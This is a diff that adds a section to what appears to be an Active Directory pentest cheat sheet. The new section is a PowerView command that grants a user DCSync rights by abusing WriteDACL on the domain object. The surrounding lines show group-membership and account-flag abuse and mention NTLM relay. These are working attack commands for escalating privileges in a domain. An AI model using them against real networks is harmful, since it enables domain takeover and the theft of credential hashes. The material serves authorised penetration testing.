@@ -299,6 +299,12 @@ Add-DomainGroupMember -Identity "<GROUP>" -Members <DOMAIN>\<USER>
 Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
+#### Add permissions for dcsync
+- When writedacl on domain object
+```
+Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
+```
+
 #### NTLMRelay
 - It is possible to abuse ACL with NTLMRelay abuse
 - Also possible to abuse Exchange Server: https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
